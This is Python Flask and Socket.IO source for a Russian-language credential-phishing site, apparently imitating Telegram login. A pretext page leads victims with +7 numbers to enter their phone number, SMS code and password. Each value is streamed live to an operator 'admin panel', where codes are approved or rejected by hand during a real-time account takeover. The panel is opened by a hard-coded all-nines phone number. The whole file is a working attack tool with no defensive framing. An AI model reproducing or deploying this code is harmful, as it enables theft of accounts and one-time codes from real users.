import eventlet
eventlet.monkey_patch()

from flask import Flask, render_template_string, request, redirect, url_for
from flask_socketio import SocketIO, emit

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

# Хранение состояний пользователей
users = {}  # phone: {'entered_code': str, 'confirmed_code': bool, 'entered_password': str, 'confirmed_password': bool}
logs = []  # Список логов для админа

def log_action(message):
    logs.append(message)
    emit('new_log', message, broadcast=True)  # Broadcasting логов для админа

@app.route('/')
def index():
    log_action('Пользователь зашел на главную страницу')
    return render_template_string('''
    <!doctype html>
    <html lang="ru">
    <head>
        <title>Авторизация</title>
        <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
        <style>
            body { font-family: 'Roboto', sans-serif; background: #fff; color: #000; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
            .container { max-width: 400px; padding: 20px; text-align: center; animation: fadeIn 0.5s; }
            @keyframes fadeIn { from {opacity: 0;} to {opacity: 1;} }
            h2 { color: #0088cc; }
            button { background: #0088cc; color: #fff; border: none; padding: 12px 24px; border-radius: 5px; cursor: pointer; transition: background 0.3s, transform 0.2s; font-size: 16px; }
            button:hover { background: #006699; transform: scale(1.05); }
            button:active { transform: scale(0.95); }
            @media (max-width: 600px) { .container { padding: 10px; } }
        </style>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
        <script>
            var socket = io();
        </script>
    </head>
    <body>
        <div class="container">
            <h2>У вас слишком большие запросы, пройдите авторизацию</h2>
            <button onclick="window.location.href='/phone'">Авторизация</button>
        </div>
    </body>
    </html>
    ''')

@app.route('/phone')
def phone():
    log_action('Пользователь перешел к вводу номера телефона')
    return render_template_string('''
    <!doctype html>
    <html lang="ru">
    <head>
        <title>Ввод номера</title>
        <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
        <style>
            body { font-family: 'Roboto', sans-serif; background: #fff; color: #000; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
            .container { max-width: 400px; padding: 20px; text-align: center; animation: fadeIn 0.5s; }
            @keyframes fadeIn { from {opacity: 0;} to {opacity: 1;} }
            input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; font-size: 16px; transition: border 0.3s; box-sizing: border-box; }
            input:focus { border-color: #0088cc; outline: none; }
            button { background: #0088cc; color: #fff; border: none; padding: 12px 24px; border-radius: 5px; cursor: pointer; transition: background 0.3s, transform 0.2s; font-size: 16px; }
            button:hover { background: #006699; transform: scale(1.05); }
            button:active { transform: scale(0.95); }
            .error { color: red; }
            @media (max-width: 600px) { .container { padding: 10px; } input { font-size: 14px; } }
        </style>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
        <script>
            var socket = io();
            function submitPhone() {
                var phone = document.getElementById('phone').value;
                if (!phone.startsWith('+7') || phone.length < 12) {
                    document.getElementById('error').innerText = 'Поддерживаются только номера России и Казахстана (+7...)';
                    return;
                }
                socket.emit('submit_phone', phone);
            }
        </script>
    </head>
    <body>
        <div class="container">
            <h2>Введите номер телефона</h2>
            <input id="phone" type="tel" placeholder="+7 (XXX) XXX-XX-XX" />
            <p id="error" class="error"></p>
            <button onclick="submitPhone()">Отправить</button>
        </div>
    </body>
    </html>
    ''')

@socketio.on('submit_phone')
def handle_phone(phone):
    if not phone.startswith('+7'):
        return
    # Проверка на админский номер: все цифры после +7 - 9
    digits = phone[2:]  # Убираем +7
    if len(digits) == 10 and all(d == '9' for d in digits):
        log_action(f'Админ вошел с номером: {phone}')
        emit('redirect_to_admin', {'url': '/admin'})
        return
    users[phone] = {'entered_code': None, 'confirmed_code': False, 'entered_password': None, 'confirmed_password': False}
    log_action(f'Пользователь подал номер: {phone}')
    emit('phone_submitted', {'phone': phone})  # Для клиента, чтобы перейти к коду

@app.route('/code')
def code():
    phone = request.args.get('phone')
    if not phone or phone not in users:
        return 'Ошибка: Номер не найден', 400
    log_action(f'Пользователь {phone} перешел к вводу кода')
    return render_template_string('''
    <!doctype html>
    <html lang="ru">
    <head>
        <title>Ввод кода</title>
        <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
        <style>
            body { font-family: 'Roboto', sans-serif; background: #fff; color: #000; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
            .container { max-width: 400px; padding: 20px; text-align: center; animation: fadeIn 0.5s; }
            @keyframes fadeIn { from {opacity: 0;} to {opacity: 1;} }
            input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; font-size: 16px; transition: border 0.3s; box-sizing: border-box; }
            input:focus { border-color: #0088cc; outline: none; }
            button { background: #0088cc; color: #fff; border: none; padding: 12px 24px; border-radius: 5px; cursor: pointer; transition: background 0.3s, transform 0.2s; font-size: 16px; }
            button:hover { background: #006699; transform: scale(1.05); }
            button:active { transform: scale(0.95); }
            .error { color: red; }
            @media (max-width: 600px) { .container { padding: 10px; } input { font-size: 14px; } }
        </style>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
        <script>
            var socket = io();
            var phone = '{{ phone }}';
            function submitCode() {
                var code = document.getElementById('code').value;
                socket.emit('submit_code', {phone: phone, code: code});
            }
            socket.on('code_confirmed', function(data) {
                if (data.phone === phone && data.confirmed) {
                    window.location.href = '/password?phone=' + encodeURIComponent(phone);
                } else if (data.phone === phone) {
                    document.getElementById('error').innerText = 'Код неверный';
                }
            });
            socket.on('redirect_to_admin', function(data) {
                window.location.href = data.url;
            });
        </script>
    </head>
    <body>
        <div class="container">
            <h2>Введите SMS-код</h2>
            <input id="code" type="text" placeholder="XXXXXX" maxlength="6" />
            <p id="error" class="error"></p>
            <button onclick="submitCode()">Проверить</button>
        </div>
    </body>
    </html>
    ''', phone=phone)

@app.route('/password')
def password():
    phone = request.args.get('phone')
    if not phone or phone not in users or not users[phone]['confirmed_code']:
        return 'Ошибка: Код не подтвержден', 400
    log_action(f'Пользователь {phone} перешел к вводу пароля')
    return render_template_string('''
    <!doctype html>
    <html lang="ru">
    <head>
        <title>Ввод пароля</title>
        <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
        <style>
            body { font-family: 'Roboto', sans-serif; background: #fff; color: #000; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
            .container { max-width: 400px; padding: 20px; text-align: center; animation: fadeIn 0.5s; }
            @keyframes fadeIn { from {opacity: 0;} to {opacity: 1;} }
            input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; font-size: 16px; transition: border 0.3s; box-sizing: border-box; }
            input:focus { border-color: #0088cc; outline: none; }
            button { background: #0088cc; color: #fff; border: none; padding: 12px 24px; border-radius: 5px; cursor: pointer; transition: background 0.3s, transform 0.2s; font-size: 16px; }
            button:hover { background: #006699; transform: scale(1.05); }
            button:active { transform: scale(0.95); }
            .error { color: red; }
            @media (max-width: 600px) { .container { padding: 10px; } input { font-size: 14px; } }
        </style>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
        <script>
            var socket = io();
            var phone = '{{ phone }}';
            function submitPassword() {
                var password = document.getElementById('password').value;
                socket.emit('submit_password', {phone: phone, password: password});
            }
            socket.on('password_confirmed', function(data) {
                if (data.phone === phone && data.confirmed) {
                    document.getElementById('status').innerText = 'Авторизация успешна!';
                } else if (data.phone === phone) {
                    document.getElementById('error').innerText = 'Пароль неверный';
                }
            });
        </script>
    </head>
    <body>
        <div class="container">
            <h2>Введите пароль</h2>
            <input id="password" type="password" placeholder="Пароль" />
            <p id="error" class="error"></p>
            <button onclick="submitPassword()">Проверить</button>
            <p id="status" style="color: green;"></p>
        </div>
    </body>
    </html>
    ''', phone=phone)

@app.route('/admin')
def admin():
    return render_template_string('''
    <!doctype html>
    <html lang="ru">
    <head>
        <title>Админ-панель</title>
        <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
        <style>
            body { font-family: 'Roboto', sans-serif; background: #fff; color: #000; margin: 0; padding: 20px; }
            .container { max-width: 600px; margin: auto; }
            #logs { height: 200px; overflow-y: scroll; border: 1px solid #ddd; padding: 10px; margin-bottom: 20px; border-radius: 5px; }
            #pending { border: 1px solid #ddd; padding: 10px; border-radius: 5px; }
            button { background: #0088cc; color: #fff; border: none; padding: 8px 16px; border-radius: 5px; cursor: pointer; transition: background 0.3s; margin: 5px; }
            button:hover { background: #006699; }
            button.reject { background: #cc0000; }
            button.reject:hover { background: #990000; }
            @media (max-width: 600px) { body { padding: 10px; } }
        </style>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
        <script>
            var socket = io();
            socket.on('new_log', function(msg){
                var div = document.getElementById('logs');
                div.innerHTML += msg + '<br>';
                div.scrollTop = div.scrollHeight;
            });
            socket.on('new_code', function(data){
                var pending = document.getElementById('pending');
                var entry = document.createElement('div');
                entry.id = 'code-' + data.phone;
                entry.innerHTML = `Номер: ${data.phone}, Введенный код: ${data.code} <button onclick="confirmCode('${data.phone}', true)">Код верный</button><button class="reject" onclick="confirmCode('${data.phone}', false)">Код неверный</button>`;
                pending.appendChild(entry);
            });
            socket.on('new_password', function(data){
                var pending = document.getElementById('pending');
                var entry = document.createElement('div');
                entry.id = 'password-' + data.phone;
                entry.innerHTML = `Номер: ${data.phone}, Введенный пароль: ${data.password} <button onclick="confirmPassword('${data.phone}', true)">Пароль верный</button><button class="reject" onclick="confirmPassword('${data.phone}', false)">Пароль неверный</button>`;
                pending.appendChild(entry);
            });
            function confirmCode(phone, confirmed) {
                socket.emit('confirm_code', {phone: phone, confirmed: confirmed});
                var entry = document.getElementById('code-' + phone);
                if (entry) entry.remove();
            }
            function confirmPassword(phone, confirmed) {
                socket.emit('confirm_password', {phone: phone, confirmed: confirmed});
                var entry = document.getElementById('password-' + phone);
                if (entry) entry.remove();
            }
        </script>
    </head>
    <body>
        <div class="container">
            <h2>Админ-панель</h2>
            <div id="logs" style="height:300px;overflow-y:scroll;border:1px solid #ccc"></div>
            <h3>Ожидающие подтверждения</h3>
            <div id="pending"></div>
        </div>
    </body>
    </html>
    ''')

@socketio.on('submit_code')
def handle_code(data):
    phone = data['phone']
    code = data['code']
    if phone in users:
        users[phone]['entered_code'] = code
        log_action(f'Пользователь {phone} ввел код: {code}')
        emit('new_code', {'phone': phone, 'code': code}, broadcast=True)  # Для админа

@socketio.on('confirm_code')
def confirm_code(data):
    phone = data['phone']
    confirmed = data['confirmed']
    if phone in users:
        users[phone]['confirmed_code'] = confirmed
        emit('code_confirmed', {'phone': phone, 'confirmed': confirmed})
        log_action(f'Админ {"подтвердил" if confirmed else "отклонил"} код для {phone}')

@socketio.on('submit_password')
def handle_password(data):
    phone = data['phone']
    password = data['password']
    if phone in users:
        users[phone]['entered_password'] = password
        log_action(f'Пользователь {phone} ввел пароль: {password}')
        emit('new_password', {'phone': phone, 'password': password}, broadcast=True)  # Для админа

@socketio.on('confirm_password')
def confirm_password(data):
    phone = data['phone']
    confirmed = data['confirmed']
    if phone in users:
        users[phone]['confirmed_password'] = confirmed
        emit('password_confirmed', {'phone': phone, 'confirmed': confirmed})
        log_action(f'Админ {"подтвердил" if confirmed else "отклонил"} пароль для {phone}')

if __name__ == '__main__':
    import os
    port = int(os.environ.get("PORT", 5000))
    socketio.run(app, host="0.0.0.0", port=port)
